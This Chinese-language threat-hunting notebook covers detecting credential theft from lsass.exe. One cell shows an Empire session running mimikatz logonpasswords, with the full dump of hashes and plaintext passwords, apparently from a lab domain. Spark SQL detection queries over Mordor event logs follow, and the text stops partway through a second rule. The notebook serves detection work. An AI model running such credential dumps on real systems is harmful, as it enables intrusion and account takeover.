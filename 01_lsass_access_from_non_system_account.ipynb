{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "kernelspec": {
      "display_name": "Python 3",
      "language": "python",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.8.5"
    },
    "colab": {
      "name": "01-lsass_access_from_non_system_account.ipynb",
      "provenance": []
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Jb8kzBROE_g5"
      },
      "source": [
        "# LSASS异常访问（LSASS ACCESS From Non System Account）"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "8EJAP_gYE_hC"
      },
      "source": [
        "## 概述"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "OqT5q0QfE_hD"
      },
      "source": [
        "```\n",
        "———————————————————————————\n",
        "|  编写作者  |     G4rb3n   |\n",
        "---------------------------\n",
        "|  攻击矩阵  |   T1003.001  |  \n",
        "---------------------------\n",
        "|  创建时间  |   2021-2-14  |  \n",
        "---------------------------\n",
        "|  修改时间  |   2021-2-27  |  \n",
        "———————————————————————————\n",
        "```"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Hj--91LAE_hE"
      },
      "source": [
        "## 攻击场景"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "l8pIiZg6E_hE"
      },
      "source": [
        "黑客通过访问lsass.exe进程，以窃取凭证。"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "16-ryKqQE_hF"
      },
      "source": [
        "## 攻击模拟"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "8NwHkpdrFMc9"
      },
      "source": [
        "(Empire: agents) > agents\n",
        "\n",
        "[*] Active agents:\n",
        "\n",
        "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
        "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
        "62HY9XCK ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         3172   5/0.0    2020-08-07 14:30:45  http            \n",
        "B7Y8G4XC ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         1648   5/0.0    2020-08-07 14:31:46  http            \n",
        "\n",
        "(Empire: agents) > interact B7Y8G4XC\n",
        "(Empire: B7Y8G4XC) > \n",
        "(Empire: B7Y8G4XC) > usemodule credentials/mimikatz/logonpasswords*\n",
        "(Empire: powershell/credentials/mimikatz/logonpasswords) > info\n",
        "\n",
        "              Name: Invoke-Mimikatz DumpCreds\n",
        "            Module: powershell/credentials/mimikatz/logonpasswords\n",
        "        NeedsAdmin: True\n",
        "        OpsecSafe: True\n",
        "          Language: powershell\n",
        "MinLanguageVersion: 2\n",
        "        Background: True\n",
        "  OutputExtension: None\n",
        "\n",
        "Authors:\n",
        "  @JosephBialek\n",
        "  @gentilkiwi\n",
        "\n",
        "Description:\n",
        "  Runs PowerSploit's Invoke-Mimikatz function to extract\n",
        "  plaintext credentials from memory.\n",
        "\n",
        "Comments:\n",
        "  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com\n",
        "\n",
        "Options:\n",
        "\n",
        "  Name  Required    Value                     Description\n",
        "  ----  --------    -------                   -----------\n",
        "  Agent True        B7Y8G4XC                  Agent to run module on.                 \n",
        "\n",
        "(Empire: powershell/credentials/mimikatz/logonpasswords) > execute\n",
        "[*] Tasked B7Y8G4XC to run TASK_CMD_JOB\n",
        "[*] Agent B7Y8G4XC tasked with task ID 1\n",
        "[*] Tasked agent B7Y8G4XC to run module powershell/credentials/mimikatz/logonpasswords\n",
        "(Empire: powershell/credentials/mimikatz/logonpasswords) > \n",
        "Job started: FH5UKE\n",
        "\n",
        "Hostname: WORKSTATION5.theshire.local / S-1-5-21-1363495622-3806888128-621328882\n",
        "\n",
        "  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  4 2020 20:16:54\n",
        ".## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n",
        "## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n",
        "## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n",
        "'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n",
        "  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n",
        "\n",
        "mimikatz(powershell) # sekurlsa::logonpasswords\n",
        "\n",
        "Authentication Id : 0 ; 2868007 (00000000:002bc327)\n",
        "Session           : RemoteInteractive from 2\n",
        "User Name         : pgustavo\n",
        "Domain            : THESHIRE\n",
        "Logon Server      : MORDORDC\n",
        "Logon Time        : 8/5/2020 9:46:24 PM\n",
        "SID               : S-1-5-21-1363495622-3806888128-621328882-1104\n",
        "        msv :\n",
        "        [00000003] Primary\n",
        "        * Username : pgustavo\n",
        "        * Domain   : THESHIRE\n",
        "        * NTLM     : 81d310fa34e6a56a31145445891bb7b8\n",
        "        * SHA1     : 2a953d745ed80427e309d957d20b0eeca3cd3d69\n",
        "        * DPAPI    : be8815c8ec59ddeda43d2301dbc29c2c\n",
        "        tspkg :\n",
        "        wdigest :\n",
        "        * Username : pgustavo\n",
        "        * Domain   : THESHIRE\n",
        "        * Password : W1n1!2019\n",
        "        kerberos :\n",
        "        * Username : pgustavo\n",
        "        * Domain   : THESHIRE.LOCAL\n",
        "        * Password : (null)\n",
        "        ssp :\n",
        "        credman :\n",
        "        cloudap :\n",
        "\n",
        "Authentication Id : 0 ; 2860578 (00000000:002ba622)\n",
        "Session           : RemoteInteractive from 2\n",
        "User Name         : pgustavo\n",
        "Domain            : THESHIRE\n",
        "Logon Server      : MORDORDC\n",
        "Logon Time        : 8/5/2020 9:46:24 PM\n",
        "SID               : S-1-5-21-1363495622-3806888128-621328882-1104\n",
        "        msv :\n",
        "        [00000003] Primary\n",
        "        * Username : pgustavo\n",
        "        * Domain   : THESHIRE\n",
        "        * NTLM     : 81d310fa34e6a56a31145445891bb7b8\n",
        "        * SHA1     : 2a953d745ed80427e309d957d20b0eeca3cd3d69\n",
        "        * DPAPI    : be8815c8ec59ddeda43d2301dbc29c2c\n",
        "        tspkg :\n",
        "        wdigest :\n",
        "        * Username : pgustavo\n",
        "        * Domain   : THESHIRE\n",
        "        * Password : W1n1!2019\n",
        "        kerberos :\n",
        "        * Username : pgustavo\n",
        "        * Domain   : THESHIRE.LOCAL\n",
        "        * Password : (null)\n",
        "        ssp :\n",
        "        credman :\n",
        "        cloudap :\n",
        "\n",
        "Authentication Id : 0 ; 2778269 (00000000:002a649d)\n",
        "Session           : Interactive from 2\n",
        "User Name         : DWM-2\n",
        "Domain            : Window Manager\n",
        "Logon Server      : (null)\n",
        "Logon Time        : 8/5/2020 9:46:21 PM\n",
        "SID               : S-1-5-90-0-2\n",
        "        msv :\n",
        "        [00000003] Primary\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : THESHIRE\n",
        "        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b\n",
        "        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7\n",
        "        tspkg :\n",
        "        wdigest :\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : THESHIRE\n",
        "        * Password : \"\\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$\"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8\n",
        "        kerberos :\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : theshire.local\n",
        "        * Password : \"\\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$\"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8\n",
        "        ssp :\n",
        "        credman :\n",
        "        cloudap :\n",
        "\n",
        "Authentication Id : 0 ; 2776485 (00000000:002a5da5)\n",
        "Session           : Interactive from 2\n",
        "User Name         : DWM-2\n",
        "Domain            : Window Manager\n",
        "Logon Server      : (null)\n",
        "Logon Time        : 8/5/2020 9:46:21 PM\n",
        "SID               : S-1-5-90-0-2\n",
        "        msv :\n",
        "        [00000003] Primary\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : THESHIRE\n",
        "        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b\n",
        "        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7\n",
        "        tspkg :\n",
        "        wdigest :\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : THESHIRE\n",
        "        * Password : \"\\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$\"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8\n",
        "        kerberos :\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : theshire.local\n",
        "        * Password : \"\\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$\"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8\n",
        "        ssp :\n",
        "        credman :\n",
        "        cloudap :\n",
        "\n",
        "Authentication Id : 0 ; 2771168 (00000000:002a48e0)\n",
        "Session           : Interactive from 2\n",
        "User Name         : UMFD-2\n",
        "Domain            : Font Driver Host\n",
        "Logon Server      : (null)\n",
        "Logon Time        : 8/5/2020 9:46:20 PM\n",
        "SID               : S-1-5-96-0-2\n",
        "        msv :\n",
        "        [00000003] Primary\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : THESHIRE\n",
        "        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b\n",
        "        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7\n",
        "        tspkg :\n",
        "        wdigest :\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : THESHIRE\n",
        "        * Password : \"\\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$\"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8\n",
        "        kerberos :\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : theshire.local\n",
        "        * Password : \"\\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$\"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8\n",
        "        ssp :\n",
        "        credman :\n",
        "        cloudap :\n",
        "\n",
        "Authentication Id : 0 ; 997 (00000000:000003e5)\n",
        "Session           : Service from 0\n",
        "User Name         : LOCAL SERVICE\n",
        "Domain            : NT AUTHORITY\n",
        "Logon Server      : (null)\n",
        "Logon Time        : 8/5/2020 9:26:08 PM\n",
        "SID               : S-1-5-19\n",
        "        msv :\n",
        "        tspkg :\n",
        "        wdigest :\n",
        "        * Username : (null)\n",
        "        * Domain   : (null)\n",
        "        * Password : (null)\n",
        "        kerberos :\n",
        "        * Username : (null)\n",
        "        * Domain   : (null)\n",
        "        * Password : (null)\n",
        "        ssp :\n",
        "        credman :\n",
        "        cloudap :\n",
        "\n",
        "Authentication Id : 0 ; 56937 (00000000:0000de69)\n",
        "Session           : Interactive from 1\n",
        "User Name         : DWM-1\n",
        "Domain            : Window Manager\n",
        "Logon Server      : (null)\n",
        "Logon Time        : 8/5/2020 9:26:08 PM\n",
        "SID               : S-1-5-90-0-1\n",
        "        msv :\n",
        "        [00000003] Primary\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : THESHIRE\n",
        "        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b\n",
        "        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7\n",
        "        tspkg :\n",
        "        wdigest :\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : THESHIRE\n",
        "        * Password : \"\\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$\"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8\n",
        "        kerberos :\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : theshire.local\n",
        "        * Password : \"\\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$\"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8\n",
        "        ssp :\n",
        "        credman :\n",
        "        cloudap :\n",
        "\n",
        "Authentication Id : 0 ; 56865 (00000000:0000de21)\n",
        "Session           : Interactive from 1\n",
        "User Name         : DWM-1\n",
        "Domain            : Window Manager\n",
        "Logon Server      : (null)\n",
        "Logon Time        : 8/5/2020 9:26:08 PM\n",
        "SID               : S-1-5-90-0-1\n",
        "        msv :\n",
        "        [00000003] Primary\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : THESHIRE\n",
        "        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b\n",
        "        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7\n",
        "        tspkg :\n",
        "        wdigest :\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : THESHIRE\n",
        "        * Password : \"\\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$\"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8\n",
        "        kerberos :\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : theshire.local\n",
        "        * Password : \"\\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$\"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8\n",
        "        ssp :\n",
        "        credman :\n",
        "        cloudap :\n",
        "\n",
        "Authentication Id : 0 ; 996 (00000000:000003e4)\n",
        "Session           : Service from 0\n",
        "User Name         : WORKSTATION5$\n",
        "Domain            : THESHIRE\n",
        "Logon Server      : (null)\n",
        "Logon Time        : 8/5/2020 9:26:07 PM\n",
        "SID               : S-1-5-20\n",
        "        msv :\n",
        "        [00000003] Primary\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : THESHIRE\n",
        "        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b\n",
        "        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7\n",
        "        tspkg :\n",
        "        wdigest :\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : THESHIRE\n",
        "        * Password : \"\\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$\"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8\n",
        "        kerberos :\n",
        "        * Username : workstation5$\n",
        "        * Domain   : THESHIRE.LOCAL\n",
        "        * Password : (null)\n",
        "        ssp :\n",
        "        credman :\n",
        "        cloudap :\n",
        "\n",
        "Authentication Id : 0 ; 33194 (00000000:000081aa)\n",
        "Session           : Interactive from 0\n",
        "User Name         : UMFD-0\n",
        "Domain            : Font Driver Host\n",
        "Logon Server      : (null)\n",
        "Logon Time        : 8/5/2020 9:26:07 PM\n",
        "SID               : S-1-5-96-0-0\n",
        "        msv :\n",
        "        [00000003] Primary\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : THESHIRE\n",
        "        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b\n",
        "        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7\n",
        "        tspkg :\n",
        "        wdigest :\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : THESHIRE\n",
        "        * Password : \"\\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$\"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8\n",
        "        kerberos :\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : theshire.local\n",
        "        * Password : \"\\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$\"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8\n",
        "        ssp :\n",
        "        credman :\n",
        "        cloudap :\n",
        "\n",
        "Authentication Id : 0 ; 33086 (00000000:0000813e)\n",
        "Session           : Interactive from 1\n",
        "User Name         : UMFD-1\n",
        "Domain            : Font Driver Host\n",
        "Logon Server      : (null)\n",
        "Logon Time        : 8/5/2020 9:26:07 PM\n",
        "SID               : S-1-5-96-0-1\n",
        "        msv :\n",
        "        [00000003] Primary\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : THESHIRE\n",
        "        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b\n",
        "        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7\n",
        "        tspkg :\n",
        "        wdigest :\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : THESHIRE\n",
        "        * Password : \"\\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$\"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8\n",
        "        kerberos :\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : theshire.local\n",
        "        * Password : \"\\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$\"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8\n",
        "        ssp :\n",
        "        credman :\n",
        "        cloudap :\n",
        "\n",
        "Authentication Id : 0 ; 31553 (00000000:00007b41)\n",
        "Session           : UndefinedLogonType from 0\n",
        "User Name         : (null)\n",
        "Domain            : (null)\n",
        "Logon Server      : (null)\n",
        "Logon Time        : 8/5/2020 9:26:07 PM\n",
        "SID               : \n",
        "        msv :\n",
        "        [00000003] Primary\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : THESHIRE\n",
        "        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b\n",
        "        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7\n",
        "        tspkg :\n",
        "        wdigest :\n",
        "        kerberos :\n",
        "        ssp :\n",
        "        credman :\n",
        "        cloudap :\n",
        "\n",
        "Authentication Id : 0 ; 999 (00000000:000003e7)\n",
        "Session           : UndefinedLogonType from 0\n",
        "User Name         : WORKSTATION5$\n",
        "Domain            : THESHIRE\n",
        "Logon Server      : (null)\n",
        "Logon Time        : 8/5/2020 9:26:06 PM\n",
        "SID               : S-1-5-18\n",
        "        msv :\n",
        "        tspkg :\n",
        "        wdigest :\n",
        "        * Username : WORKSTATION5$\n",
        "        * Domain   : THESHIRE\n",
        "        * Password : \"\\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$\"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8\n",
        "        kerberos :\n",
        "        * Username : workstation5$\n",
        "        * Domain   : THESHIRE.LOCAL\n",
        "        * Password : (null)\n",
        "        ssp :\n",
        "        credman :\n",
        "        cloudap :\n",
        "\n",
        "mimikatz(powershell) # exit\n",
        "Bye!\n",
        "\n",
        "(Empire: powershell/credentials/mimikatz/logonpasswords) >"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "XBR3zuOyE_hO"
      },
      "source": [
        "## 威胁狩猎"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "3hkxch16E_hS"
      },
      "source": [
        "### 狩猎原理"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "kU0UcgbjE_hT"
      },
      "source": [
        "通过进程间访问、DLL文件加载等事件信息，监控Lsass凭证窃取的行为。"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "qN7e7oDSE_hT"
      },
      "source": [
        "### 初始化分析引擎"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "GXFSXwxTE_hU"
      },
      "source": [
        "from openhunt.mordorutils import *\n",
        "spark = get_spark()"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "a6noDl5FE_hU"
      },
      "source": [
        "### 下载&加载Mordor日志集"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "D_30FUBDE_hV",
        "outputId": "0b798781-f78a-4574-aa3f-56823bc210a9"
      },
      "source": [
        "mordor_file = \"https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/empire_mimikatz_logonpasswords.zip\"\n",
        "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "[+] Processing a Spark DataFrame..\n",
            "[+] DataFrame Returned !\n",
            "[+] Temporary SparkSQL View: mordorTable \n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "AC3StdcAE_hW"
      },
      "source": [
        "### 日志集统计"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "SV2f4TEKE_hW",
        "outputId": "af8eb369-b68b-43a2-d35d-3688050c3f51"
      },
      "source": [
        "df = spark.sql(\n",
        "'''\n",
        "SELECT Hostname,Channel,EventID, Count(*) as count\n",
        "FROM mordorTable\n",
        "GROUP BY Hostname,Channel,EventID\n",
        "ORDER BY count DESC\n",
        "'''\n",
        ")\n",
        "df.show(truncate=False)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "+---------------------------+----------------------------------------+-------+-----+\n",
            "|Hostname                   |Channel                                 |EventID|count|\n",
            "+---------------------------+----------------------------------------+-------+-----+\n",
            "|WORKSTATION5.theshire.local|Windows PowerShell                      |800    |2940 |\n",
            "|WORKSTATION5.theshire.local|Microsoft-Windows-PowerShell/Operational|4103   |1695 |\n",
            "|WORKSTATION5.theshire.local|Microsoft-Windows-Sysmon/Operational    |10     |181  |\n",
            "|MORDORDC.theshire.local    |Security                                |5158   |123  |\n",
            "|MORDORDC.theshire.local    |Security                                |5156   |99   |\n",
            "|MORDORDC.theshire.local    |Microsoft-Windows-Sysmon/Operational    |12     |76   |\n",
            "|WORKSTATION5.theshire.local|Security                                |5156   |73   |\n",
            "|WORKSTATION5.theshire.local|Microsoft-Windows-Sysmon/Operational    |12     |71   |\n",
            "|WORKSTATION6.theshire.local|Microsoft-Windows-Sysmon/Operational    |10     |70   |\n",
            "|WORKSTATION6.theshire.local|Security                                |4658   |64   |\n",
            "|MORDORDC.theshire.local    |Microsoft-Windows-Sysmon/Operational    |3      |55   |\n",
            "|WORKSTATION5.theshire.local|Microsoft-Windows-Sysmon/Operational    |7      |51   |\n",
            "|WORKSTATION5.theshire.local|Security                                |5158   |50   |\n",
            "|WORKSTATION6.theshire.local|Security                                |5156   |39   |\n",
            "|WORKSTATION6.theshire.local|Security                                |4656   |38   |\n",
            "|WORKSTATION5.theshire.local|Microsoft-Windows-Sysmon/Operational    |3      |35   |\n",
            "|WORKSTATION6.theshire.local|Security                                |4690   |32   |\n",
            "|WORKSTATION6.theshire.local|Security                                |4663   |32   |\n",
            "|MORDORDC.theshire.local    |Microsoft-Windows-Sysmon/Operational    |7      |30   |\n",
            "|WORKSTATION5.theshire.local|Microsoft-Windows-Sysmon/Operational    |13     |24   |\n",
            "+---------------------------+----------------------------------------+-------+-----+\n",
            "only showing top 20 rows\n",
            "\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "qpghMyPbE_hX"
      },
      "source": [
        "### 使用规则匹配攻击事件"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "HSoDnDf1E_hX"
      },
      "source": [
        "### 规则 I"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "b3evVNErE_hX"
      },
      "source": [
        "```\n",
        "——————————————————————————————————————————————————————————————————————————————————————————————\n",
        "|        日志类型        |    日志来源     |                行为场景                |    事件ID   |\n",
        "----------------------------------------------------------------------------------------------\n",
        "|       Process        |    security    |            进程访问了另一个进程          |    4663    |\n",
        "----------------------------------------------------------------------------------------------\n",
        "|       Process        |    security    |           进程请求访问另一个进程         |    4656     |\n",
        "----------------------------------------------------------------------------------------------\n",
        "|       Process        |     sysmon    |             进程访问了另一个进程          |     10      |\n",
        "——————————————————————————————————————————————————————————————————————————————————————————————\n",
        "```"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "cjj2RGE1E_hY"
      },
      "source": [
        "筛选事件ID为4663、4656（进程间操作）的security事件。"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Y8IsKmukE_hY",
        "outputId": "ae872478-ce1d-4138-bb4d-187885a88101"
      },
      "source": [
        "df = spark.sql(\n",
        "'''\n",
        "SELECT `@timestamp`, Hostname, SubjectUserName, ProcessName, ObjectName, AccessMask, EventID\n",
        "FROM mordorTable\n",
        "WHERE LOWER(Channel) = \"security\"\n",
        "    AND (EventID = 4663 OR EventID = 4656)\n",
        "    AND ObjectName LIKE \"%lsass.exe\"\n",
        "    AND NOT SubjectUserName LIKE \"%$\"\n",
        "'''\n",
        ")\n",
        "df.show(10, False)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "+------------------------+---------------------------+---------------+---------------------------------------------------------+--------------------------------------------------+----------+-------+\n",
            "|@timestamp              |Hostname                   |SubjectUserName|ProcessName                                              |ObjectName                                        |AccessMask|EventID|\n",
            "+------------------------+---------------------------+---------------+---------------------------------------------------------+--------------------------------------------------+----------+-------+\n",
            "|2020-08-07T14:32:57.592Z|WORKSTATION5.theshire.local|pgustavo       |C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe|\\Device\\HarddiskVolume2\\Windows\\System32\\lsass.exe|0x1010    |4656   |\n",
            "|2020-08-07T14:32:57.592Z|WORKSTATION5.theshire.local|pgustavo       |C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe|\\Device\\HarddiskVolume2\\Windows\\System32\\lsass.exe|0x10      |4663   |\n",
            "+------------------------+---------------------------+---------------+---------------------------------------------------------+--------------------------------------------------+----------+-------+\n",
            "\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "9I4p-UtOE_hY"
      },
      "source": [
        "筛选事件ID为10（进程间操作）的sysmon事件。"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "MD1mG0icE_hZ",
        "outputId": "1a40923d-95d9-4743-f659-1f18d92a6d6e"
      },
      "source": [
        "df = spark.sql(\n",
        "'''\n",
        "SELECT `@timestamp`, Hostname, SourceImage, TargetImage, GrantedAccess, CallTrace\n",
        "FROM mordorTable\n",
        "WHERE Channel = \"Microsoft-Windows-Sysmon/Operational\"\n",
        "    AND EventID = 10\n",
        "    AND TargetImage LIKE \"%lsass.exe\"\n",
        "    AND CallTrace LIKE \"%UNKNOWN%\"\n",
        "'''\n",
        ")\n",
        "df.show(10, False)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "+------------------------+---------------------------+---------------------------------------------------------+-----------------------------+-------------+------------------------------------------------------------------------------------------------------+\n",
            "|@timestamp              |Hostname                   |SourceImage                                              |TargetImage                  |GrantedAccess|CallTrace                                                                                             |\n",
            "+------------------------+---------------------------+---------------------------------------------------------+-----------------------------+-------------+------------------------------------------------------------------------------------------------------+\n",
            "|2020-08-07T14:32:57.589Z|WORKSTATION5.theshire.local|C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe|C:\\windows\\system32\\lsass.exe|0x1010       |C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+2726e|UNKNOWN(000002EE319439BF)|\n",
            "+------------------------+---------------------------+---------------------------------------------------------+-----------------------------+-------------+------------------------------------------------------------------------------------------------------+\n",
            "\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "KQBBooSPE_hZ"
      },
      "source": [
        "### 规则 II"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "A_3E4P9mE_hZ"
      },
      "source": [
        "```\n",
        "—————————————————————————————————————————————————————————————————————————————————————————\n",
        "|        日志类型       |     日志来源     |              行为场景             |    事件ID   |\n",
        "-----------------------------------------------------------------------------------------\n",
        "|        Module        |     sysmon     |           进程加载dll文件          |      7     |\n",
        "-----------------------------------------------------------------------------------------\n",
        "|        Module        |     sysmon     |           进程访问另一个进程        |     10     |\n",
        "—————————————————————————————————————————————————————————————————————————————————————————\n",
        "```"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "7LmYmqrUE_ha"
      },
      "source": [
        "筛选事件ID为7的sysmon事件。"
      ]
    },
    {
